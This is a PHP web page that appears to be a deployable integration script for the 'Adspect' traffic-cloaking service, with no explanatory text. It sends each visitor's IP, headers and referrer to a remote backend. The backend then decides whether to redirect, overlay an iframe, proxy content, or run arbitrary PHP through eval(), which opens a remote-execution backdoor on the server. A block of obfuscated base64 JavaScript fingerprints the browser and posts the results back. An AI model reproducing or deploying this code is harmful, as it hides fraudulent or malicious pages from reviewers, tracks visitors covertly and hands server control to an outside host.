<?php
 ini_set('display_errors', '0'); error_reporting(E_ALL); if (!function_exists('adspect')) { function adspect_exit($code, $message) { http_response_code($code); exit($message); } function adspect_dig($array, $key, $default = '') { return array_key_exists($key, $array) ? $array[$key] : $default; } function adspect_resolve_path($path) { if ($path[0] === DIRECTORY_SEPARATOR) { $path = adspect_dig($_SERVER, 'DOCUMENT_ROOT', __DIR__) . $path; } else { $path = __DIR__ . DIRECTORY_SEPARATOR . $path; } return realpath($path); } function adspect_spoof_request($url) { $_SERVER['REQUEST_METHOD'] = 'GET'; $_POST = []; $query = parse_url($url, PHP_URL_QUERY); if (is_string($query)) { parse_str($query, $_GET); $_SERVER['QUERY_STRING'] = $query; } } function adspect_try_files() { foreach (func_get_args() as $path) { if (is_file($path)) { if (!is_readable($path)) { adspect_exit(403, 'Permission denied'); } switch (strtolower(pathinfo($path, PATHINFO_EXTENSION))) { case 'php': case 'html': case 'htm': case 'phtml': case 'php5': case 'php4': case 'php3': adspect_execute($path); exit; default: header('Content-Type: ' . adspect_content_type($path)); header('Content-Length: ' . filesize($path)); readfile($path); exit; } } } adspect_exit(404, 'File not found'); } function adspect_execute() { global $_adspect; require_once func_get_arg(0); } function adspect_content_type($path) { if (function_exists('mime_content_type')) { $type = mime_content_type($path); if (is_string($type)) { return $type; } } return 'application/octet-stream'; } function adspect_serve_local($url) { $path = (string)parse_url($url, PHP_URL_PATH); if ($path === '') { return null; } $path = adspect_resolve_path($path); if (is_string($path)) { adspect_spoof_request($url); if (is_dir($path)) { chdir($path); adspect_try_files('index.php', 'index.html', 'index.htm'); return; } chdir(dirname($path)); adspect_try_files($path); return; } adspect_exit(404, 'File not found'); } function adspect_tokenize($str, $sep) { $toks = []; $tok = strtok($str, $sep); while ($tok !== false) { $toks[] = $tok; $tok = strtok($sep); } return $toks; } function adspect_x_forwarded_for() { if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) { $xff = adspect_tokenize($_SERVER['HTTP_X_FORWARDED_FOR'], ', '); } elseif (array_key_exists('HTTP_CF_CONNECTING_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_CF_CONNECTING_IP']]; } elseif (array_key_exists('HTTP_X_REAL_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_X_REAL_IP']]; } else { $xff = []; } if (array_key_exists('REMOTE_ADDR', $_SERVER)) { $xff[] = $_SERVER['REMOTE_ADDR']; } return array_unique($xff); } function adspect_headers() { $headers = []; foreach ($_SERVER as $key => $value) { if (!strncmp('HTTP_', $key, 5)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[$header] = $value; } } return $headers; } function adspect_crypt($in, $key) { $il = strlen($in); $kl = strlen($key); $out = ''; for ($i = 0; $i < $il; ++$i) { $out .= chr(ord($in[$i]) ^ ord($key[$i % $kl])); } return $out; } function adspect_proxy_headers() { $headers = []; foreach (func_get_args() as $key) { if (array_key_exists($key, $_SERVER)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[] = "{$header}: {$_SERVER[$key]}"; } } return $headers; } function adspect_proxy($url, $xff, $param = null, $key = null) { $url = parse_url($url); if (empty($url)) { adspect_exit(500, 'Invalid proxy URL'); } extract($url); $curl = curl_init(); curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_ENCODING , ''); curl_setopt($curl, CURLOPT_USERAGENT, adspect_dig($_SERVER, 'HTTP_USER_AGENT', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36')); curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); if (!isset($scheme)) { $scheme = 'http'; } if (!isset($host)) { $host = adspect_dig($_SERVER, 'HTTP_HOST', 'localhost'); } if (isset($user, $pass)) { curl_setopt($curl, CURLOPT_USERPWD, "$user:$pass"); $host = "$user:$pass@$host"; } if (isset($port)) { curl_setopt($curl, CURLOPT_PORT, $port); $host = "$host:$port"; } $origin = "$scheme://$host"; if (!isset($path)) { $path = '/'; } if ($path[0] !== '/') { $path = "/$path"; } $url = $path; if (isset($query)) { $url .= "?$query"; } curl_setopt($curl, CURLOPT_URL, $origin . $url); $headers = adspect_proxy_headers('HTTP_ACCEPT', 'HTTP_ACCEPT_ENCODING', 'HTTP_ACCEPT_LANGUAGE', 'HTTP_COOKIE'); if ($xff !== '') { $headers[] = "X-Forwarded-For: {$xff}"; } if (!empty($headers)) { curl_setopt($curl, CURLOPT_HTTPHEADER, $headers); } $data = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); $type = curl_getinfo($curl, CURLINFO_CONTENT_TYPE); curl_close($curl); http_response_code($code); if (is_string($data)) { if (isset($param, $key) && preg_match('{^text/(?:html|css)}i', $type)) { $base = $path; if ($base[-1] !== '/') { $base = dirname($base); } $base = rtrim($base, '/'); $rw = function ($m) use ($origin, $base, $param, $key) { list($repl, $what, $url) = $m; $url = parse_url($url); if (!empty($url)) { extract($url); if (isset($host)) { if (!isset($scheme)) { $scheme = 'http'; } $host = "$scheme://$host"; if (isset($user, $pass)) { $host = "$user:$pass@$host"; } if (isset($port)) { $host = "$host:$port"; } } else { $host = $origin; } if (!isset($path)) { $path = ''; } if (!strlen($path) || $path[0] !== '/') { $path = "$base/$path"; } if (!isset($query)) { $query = ''; } $host = base64_encode(adspect_crypt($host, $key)); parse_str($query, $query); $query[$param] = "$path#$host"; $repl = '?' . http_build_query($query); if (isset($fragment)) { $repl .= "#$fragment"; } if ($what[-1] === '=') { $repl = "\"$repl\""; } $repl = $what . $repl; } return $repl; }; $re = '{(href=|src=|url\()["\']?((?:https?:|(?!#|[[:alnum:]]+:))[^"\'[:space:]>)]+)["\']?}i'; $data = preg_replace_callback($re, $rw, $data); } } else { $data = ''; } header("Content-Type: $type"); header('Content-Length: ' . strlen($data)); echo $data; } function adspect($sid, $mode, $param, $key) { if (!function_exists('curl_init')) { adspect_exit(500, 'curl extension is missing'); } $xff = adspect_x_forwarded_for(); $addr = adspect_dig($xff, 0); $xff = implode(', ', $xff); if (array_key_exists($param, $_GET) && strpos($_GET[$param], '#') !== false) { list($url, $host) = explode('#', $_GET[$param], 2); $host = adspect_crypt(base64_decode($host), $key); unset($_GET[$param]); $query = http_build_query($_GET); $url = "$host$url?$query"; adspect_proxy($url, $xff, $param, $key); exit; } $ajax = intval($mode === 'ajax'); $curl = curl_init(); $sid = adspect_dig($_GET, '__sid', $sid); $ua = adspect_dig($_SERVER, 'HTTP_USER_AGENT'); $referrer = adspect_dig($_SERVER, 'HTTP_REFERER'); $query = http_build_query($_GET); if ($_SERVER['REQUEST_METHOD'] == 'POST') { $payload = json_decode($_POST['data'], true); $payload['headers'] = adspect_headers(); curl_setopt($curl, CURLOPT_POST, true); curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($payload)); } if ($ajax) { header('Access-Control-Allow-Origin: *'); $cid = adspect_dig($_SERVER, 'HTTP_X_REQUEST_ID'); } else { $cid = adspect_dig($_COOKIE, '_cid'); } curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_ENCODING , ''); curl_setopt($curl, CURLOPT_HTTPHEADER, [ 'Accept: application/json', "X-Forwarded-For: {$xff}", "X-Forwarded-Host: {$_SERVER['HTTP_HOST']}", "X-Request-ID: {$cid}", "Adspect-IP: {$addr}", "Adspect-UA: {$ua}", "Adspect-JS: {$ajax}", "Adspect-Referrer: {$referrer}", ]); curl_setopt($curl, CURLOPT_URL, "https://rpc.adspect.net/v2/{$sid}?{$query}"); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $json = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); curl_close($curl); header('Cache-Control: no-store'); switch ($code) { case 200: case 202: $data = json_decode($json, true); if (!is_array($data)) { adspect_exit(500, 'Invalid backend response'); } global $_adspect; $_adspect = $data; extract($data); if ($ajax) { switch ($action) { case 'php': ob_start(); eval($target); $data['target'] = ob_get_clean(); $json = json_encode($data); break; } if ($_SERVER['REQUEST_METHOD'] === 'POST') { header('Content-Type: application/json'); echo $json; } else { header('Content-Type: application/javascript'); echo "window._adata={$json};"; return $target; } } else { if ($js) { setcookie('_cid', $cid, time() + 60); return $target; } switch ($action) { case 'local': return adspect_serve_local($target); case 'noop': adspect_spoof_request($target); return null; case '301': case '302': case '303': header("Location: {$target}", true, (int)$action); break; case 'xar': header("X-Accel-Redirect: {$target}"); break; case 'xsf': header("X-Sendfile: {$target}"); break; case 'refresh': header("Refresh: 0; url={$target}"); break; case 'meta': $target = htmlspecialchars($target); echo "<!DOCTYPE html><head><meta http-equiv=\"refresh\" content=\"0; url={$target}\"></head>"; break; case 'iframe': $target = htmlspecialchars($target); echo "<!DOCTYPE html><iframe src=\"{$target}\" style=\"width:100%;height:100%;position:absolute;top:0;left:0;z-index:999999;border:none;\"></iframe>"; break; case 'proxy': adspect_proxy($target, $xff, $param, $key); break; case 'fetch': adspect_proxy($target, $xff); break; case 'return': if (is_numeric($target)) { http_response_code((int)$target); } else { adspect_exit(500, 'Non-numeric status code'); } break; case 'php': eval($target); break; case 'js': $target = htmlspecialchars(base64_encode($target)); echo "<!DOCTYPE html><body><script src=\"data:text/javascript;base64,{$target}\"></script></body>"; break; } } exit; case 404: adspect_exit(404, 'Stream not found'); default: adspect_exit($code, 'Backend response code ' . $code); } } } $target = adspect('bec78a7f-1273-4b9d-b208-b90dfbc2d051', 'redirect', '_', base64_decode('60LcbSOU6r6RNu2TNjq/tSeSUtSU9G9w3uBHgxqM29A=')); if (!isset($target)) { return; } ?>
<!DOCTYPE html>
<html>
<head>
	<meta http-equiv="refresh" content="10; url=<?= htmlspecialchars($target) ?>">
	<meta name="referrer" content="no-referrer">
</head>
<body>
	<script src="data:text/javascript;base64,dmFyIF8weDMwMjk9Wyd3aW5kb3cnLCd2YWx1ZScsJ2NvbnNvbGUnLCdkb2N1bWVudEVsZW1lbnQnLCdub2RlTmFtZScsJ2NhbnZhcycsJ3N1Ym1pdCcsJ2dldE93blByb3BlcnR5TmFtZXMnLCdmdW5jdGlvbicsJ2xlbmd0aCcsJzMyU0FLamlxJywnbG9jYXRpb24nLCdhdHRyaWJ1dGVzJywnc2NyZWVuJywnMzMwMTQ1aE5OQ3NnJywnbmFtZScsJ3RvU3RyaW5nJywnYXBwZW5kQ2hpbGQnLCduYXZpZ2F0b3InLCdjbG9zdXJlJywnNDIxNjkwS2t3SUN0Jywnbm90aWZpY2F0aW9ucycsJ3RoZW4nLCdQT1NUJywnd2ViZ2wnLCdocmVmJywnZGF0YScsJzcyMDg5V1RPV2ZnJywnbG9nJywnVU5NQVNLRURfVkVORE9SX1dFQkdMJywncGVybWlzc2lvbnMnLCc5akFkS0lLJywnVG91Y2hFdmVudCcsJ25vZGVWYWx1ZScsJ2RvY3VtZW50JywncHVzaCcsJ3R5cGUnLCdVTk1BU0tFRF9SRU5ERVJFUl9XRUJHTCcsJ2Vycm9ycycsJ2Zvcm0nLCdtZXNzYWdlJywndG91Y2hFdmVudCcsJ3N0cmluZ2lmeScsJzEwMjY3MW5Bb0VwUicsJ2dldEV4dGVuc2lvbicsJ2NyZWF0ZUV2ZW50JywnZ2V0UGFyYW1ldGVyJywnODI2NTY4Z2p4Q01WJywnb2JqZWN0JywnNGFOaW9zdCcsJ05vdGlmaWNhdGlvbicsJzE0NzM4OXdYRG1VVScsJzI4MTM3eE52d2FnJywnaW5wdXQnLCdjcmVhdGVFbGVtZW50JywnaGlkZGVuJ107dmFyIF8weDJjNzk9ZnVuY3Rpb24oXzB4MmUyYWFkLF8weDI4YzZmYSl7XzB4MmUyYWFkPV8weDJlMmFhZC0weDE3Njt2YXIgXzB4MzAyOTFkPV8weDMwMjlbXzB4MmUyYWFkXTtyZXR1cm4gXzB4MzAyOTFkO307KGZ1bmN0aW9uKF8weDM0N2EwOCxfMHg1N2FmOGIpe3ZhciBfMHgxYjczM2Y9XzB4MmM3OTt3aGlsZSghIVtdKXt0cnl7dmFyIF8weDNmMTdjND0tcGFyc2VJbnQoXzB4MWI3MzNmKDB4MWE1KSkrLXBhcnNlSW50KF8weDFiNzMzZigweDFhMSkpKnBhcnNlSW50KF8weDFiNzMzZigweDE5NSkpK3BhcnNlSW50KF8weDFiNzMzZigweDFhNykpKi1wYXJzZUludChfMHgxYjczM2YoMHgxYWEpKStwYXJzZUludChfMHgxYjczM2YoMHgxODQpKSstcGFyc2VJbnQoXzB4MWI3MzNmKDB4MThhKSkrcGFyc2VJbnQoXzB4MWI3MzNmKDB4MWE5KSkrcGFyc2VJbnQoXzB4MWI3MzNmKDB4MTkxKSkqcGFyc2VJbnQoXzB4MWI3MzNmKDB4MTgwKSk7aWYoXzB4M2YxN2M0PT09XzB4NTdhZjhiKWJyZWFrO2Vsc2UgXzB4MzQ3YTA4WydwdXNoJ10oXzB4MzQ3YTA4WydzaGlmdCddKCkpO31jYXRjaChfMHg0OGJjMTYpe18weDM0N2EwOFsncHVzaCddKF8weDM0N2EwOFsnc2hpZnQnXSgpKTt9fX0oXzB4MzAyOSwweDc5ZjUxKSxmdW5jdGlvbigpe3ZhciBfMHgzZWVkOTk9XzB4MmM3OTtmdW5jdGlvbiBfMHgxODdjMmUoKXt2YXIgXzB4MTBkM2E1PV8weDJjNzk7XzB4ZmYxYTc3W18weDEwZDNhNSgweDE5YyldPV8weDVhY2EwNjt2YXIgXzB4NTUzZDUzPWRvY3VtZW50W18weDEwZDNhNSgweDFhYyldKF8weDEwZDNhNSgweDE5ZCkpLF8weDJkMjdhNj1kb2N1bWVudFtfMHgxMGQzYTUoMHgxYWMpXShfMHgxMGQzYTUoMHgxYWIpKTtfMHg1NTNkNTNbJ21ldGhvZCddPV8weDEwZDNhNSgweDE4ZCksXzB4NTUzZDUzWydhY3Rpb24nXT13aW5kb3dbXzB4MTBkM2E1KDB4MTgxKV1bXzB4MTBkM2E1KDB4MThmKV0sXzB4MmQyN2E2W18weDEwZDNhNSgweDE5YSldPV8weDEwZDNhNSgweDFhZCksXzB4MmQyN2E2W18weDEwZDNhNSgweDE4NSldPV8weDEwZDNhNSgweDE5MCksXzB4MmQyN2E2W18weDEwZDNhNSgweDE3NyldPUpTT05bXzB4MTBkM2E1KDB4MWEwKV0oXzB4ZmYxYTc3KSxfMHg1NTNkNTNbXzB4MTBkM2E1KDB4MTg3KV0oXzB4MmQyN2E2KSxkb2N1bWVudFsnYm9keSddW18weDEwZDNhNSgweDE4NyldKF8weDU1M2Q1MyksXzB4NTUzZDUzW18weDEwZDNhNSgweDE3YyldKCk7fXZhciBfMHg1YWNhMDY9W10sXzB4ZmYxYTc3PXt9O3RyeXt2YXIgXzB4MzYwOTBkPWZ1bmN0aW9uKF8weDJjZTJiYyl7dmFyIF8weDRiYzVmMj1fMHgyYzc5O2lmKF8weDRiYzVmMigweDFhNik9PT10eXBlb2YgXzB4MmNlMmJjJiZudWxsIT09XzB4MmNlMmJjKXt2YXIgXzB4NWM2NjQ2PWZ1bmN0aW9uKF8weDJkYjM0Mil7dmFyIF8weGMzYTUzNj1fMHg0YmM1ZjI7dHJ5e3ZhciBfMHgxOTRmOWE9XzB4MmNlMmJjW18weDJkYjM0Ml07c3dpdGNoKHR5cGVvZiBfMHgxOTRmOWEpe2Nhc2UgXzB4YzNhNTM2KDB4MWE2KTppZihudWxsPT09XzB4MTk0ZjlhKWJyZWFrO2Nhc2UgXzB4YzNhNTM2KDB4MTdlKTpfMHgxOTRmOWE9XzB4MTk0ZjlhW18weGMzYTUzNigweDE4NildKCk7fV8weDE4YTk4N1tfMHgyZGIzNDJdPV8weDE5NGY5YTt9Y2F0Y2goXzB4OTA5YTYyKXtfMHg1YWNhMDZbXzB4YzNhNTM2KDB4MTk5KV0oXzB4OTA5YTYyW18weGMzYTUzNigweDE5ZSldKTt9fSxfMHgxOGE5ODc9e30sXzB4MzU3OThhO2ZvcihfMHgzNTc5OGEgaW4gXzB4MmNlMmJjKV8weDVjNjY0NihfMHgzNTc5OGEpO3RyeXt2YXIgXzB4NGEzYjhhPU9iamVjdFtfMHg0YmM1ZjIoMHgxN2QpXShfMHgyY2UyYmMpO2ZvcihfMHgzNTc5OGE9MHgwO18weDM1Nzk4YTxfMHg0YTNiOGFbXzB4NGJjNWYyKDB4MTdmKV07KytfMHgzNTc5OGEpXzB4NWM2NjQ2KF8weDRhM2I4YVtfMHgzNTc5OGFdKTtfMHgxOGE5ODdbJyEhJ109XzB4NGEzYjhhO31jYXRjaChfMHgyYzFiYzApe18weDVhY2EwNlsncHVzaCddKF8weDJjMWJjMFtfMHg0YmM1ZjIoMHgxOWUpXSk7fXJldHVybiBfMHgxOGE5ODc7fX07XzB4ZmYxYTc3W18weDNlZWQ5OSgweDE4MyldPV8weDM2MDkwZCh3aW5kb3dbJ3NjcmVlbiddKSxfMHhmZjFhNzdbXzB4M2VlZDk5KDB4MTc2KV09XzB4MzYwOTBkKHdpbmRvdyksXzB4ZmYxYTc3WyduYXZpZ2F0b3InXT1fMHgzNjA5MGQod2luZG93W18weDNlZWQ5OSgweDE4OCldKSxfMHhmZjFhNzdbXzB4M2VlZDk5KDB4MTgxKV09XzB4MzYwOTBkKHdpbmRvd1tfMHgzZWVkOTkoMHgxODEpXSksXzB4ZmYxYTc3W18weDNlZWQ5OSgweDE3OCldPV8weDM2MDkwZCh3aW5kb3dbXzB4M2VlZDk5KDB4MTc4KV0pLF8weGZmMWE3N1tfMHgzZWVkOTkoMHgxNzkpXT1mdW5jdGlvbihfMHgzY2NmY2Mpe3ZhciBfMHg1YzM5NTk9XzB4M2VlZDk5O3RyeXt2YXIgXzB4MmYxNmFkPXt9O18weDNjY2ZjYz1fMHgzY2NmY2NbXzB4NWMzOTU5KDB4MTgyKV07Zm9yKHZhciBfMHgxY2ExMWQgaW4gXzB4M2NjZmNjKV8weDFjYTExZD1fMHgzY2NmY2NbXzB4MWNhMTFkXSxfMHgyZjE2YWRbXzB4MWNhMTFkW18weDVjMzk1OSgweDE3YSldXT1fMHgxY2ExMWRbXzB4NWMzOTU5KDB4MTk3KV07cmV0dXJuIF8weDJmMTZhZDt9Y2F0Y2goXzB4MjQ0Y2UxKXtfMHg1YWNhMDZbJ3B1c2gnXShfMHgyNDRjZTFbXzB4NWMzOTU5KDB4MTllKV0pO319KGRvY3VtZW50W18weDNlZWQ5OSgweDE3OSldKSxfMHhmZjFhNzdbXzB4M2VlZDk5KDB4MTk4KV09XzB4MzYwOTBkKGRvY3VtZW50KTt0cnl7XzB4ZmYxYTc3Wyd0aW1lem9uZU9mZnNldCddPW5ldyBEYXRlKClbJ2dldFRpbWV6b25lT2Zmc2V0J10oKTt9Y2F0Y2goXzB4Mzk4ZTExKXtfMHg1YWNhMDZbJ3B1c2gnXShfMHgzOThlMTFbXzB4M2VlZDk5KDB4MTllKV0pO310cnl7XzB4ZmYxYTc3W18weDNlZWQ5OSgweDE4OSldPWZ1bmN0aW9uKCl7fVtfMHgzZWVkOTkoMHgxODYpXSgpO31jYXRjaChfMHgzNWY2OTApe18weDVhY2EwNltfMHgzZWVkOTkoMHgxOTkpXShfMHgzNWY2OTBbJ21lc3NhZ2UnXSk7fXRyeXtfMHhmZjFhNzdbXzB4M2VlZDk5KDB4MTlmKV09ZG9jdW1lbnRbXzB4M2VlZDk5KDB4MWEzKV0oXzB4M2VlZDk5KDB4MTk2KSlbXzB4M2VlZDk5KDB4MTg2KV0oKTt9Y2F0Y2goXzB4NWQ2NjBiKXtfMHg1YWNhMDZbJ3B1c2gnXShfMHg1ZDY2MGJbJ21lc3NhZ2UnXSk7fXRyeXtfMHgzNjA5MGQ9ZnVuY3Rpb24oKXt9O3ZhciBfMHg1MThmZWU9MHgwO18weDM2MDkwZFtfMHgzZWVkOTkoMHgxODYpXT1mdW5jdGlvbigpe3JldHVybisrXzB4NTE4ZmVlLCcnO30sY29uc29sZVtfMHgzZWVkOTkoMHgxOTIpXShfMHgzNjA5MGQpLF8weGZmMWE3N1sndG9zdHJpbmcnXT1fMHg1MThmZWU7fWNhdGNoKF8weDFkYjU3Zil7XzB4NWFjYTA2WydwdXNoJ10oXzB4MWRiNTdmW18weDNlZWQ5OSgweDE5ZSldKTt9d2luZG93W18weDNlZWQ5OSgweDE4OCldW18weDNlZWQ5OSgweDE5NCldWydxdWVyeSddKHsnbmFtZSc6XzB4M2VlZDk5KDB4MThiKX0pW18weDNlZWQ5OSgweDE4YyldKGZ1bmN0aW9uKF8weDMwOWI1MCl7dmFyIF8weDI2MTRmZD1fMHgzZWVkOTk7XzB4ZmYxYTc3WydwZXJtaXNzaW9ucyddPVt3aW5kb3dbXzB4MjYxNGZkKDB4MWE4KV1bJ3Blcm1pc3Npb24nXSxfMHgzMDliNTBbJ3N0YXRlJ11dLF8weDE4N2MyZSgpO30sXzB4MTg3YzJlKTt0cnl7dmFyIF8weDJhZDMwYz1kb2N1bWVudFtfMHgzZWVkOTkoMHgxYWMpXShfMHgzZWVkOTkoMHgxN2IpKVsnZ2V0Q29udGV4dCddKF8weDNlZWQ5OSgweDE4ZSkpLF8weDIwMDM5ND1fMHgyYWQzMGNbXzB4M2VlZDk5KDB4MWEyKV0oJ1dFQkdMX2RlYnVnX3JlbmRlcmVyX2luZm8nKTtfMHhmZjFhNzdbJ3dlYmdsJ109eyd2ZW5kb3InOl8weDJhZDMwY1snZ2V0UGFyYW1ldGVyJ10oXzB4MjAwMzk0W18weDNlZWQ5OSgweDE5MyldKSwncmVuZGVyZXInOl8weDJhZDMwY1tfMHgzZWVkOTkoMHgxYTQpXShfMHgyMDAzOTRbXzB4M2VlZDk5KDB4MTliKV0pfTt9Y2F0Y2goXzB4NWU2ZjkzKXtfMHg1YWNhMDZbXzB4M2VlZDk5KDB4MTk5KV0oXzB4NWU2ZjkzW18weDNlZWQ5OSgweDE5ZSldKTt9fWNhdGNoKF8weDRmZDg0Zil7XzB4NWFjYTA2W18weDNlZWQ5OSgweDE5OSldKF8weDRmZDg0ZltfMHgzZWVkOTkoMHgxOWUpXSksXzB4MTg3YzJlKCk7fX0oKSk7"></script>
</body>
</html>
<?php exit;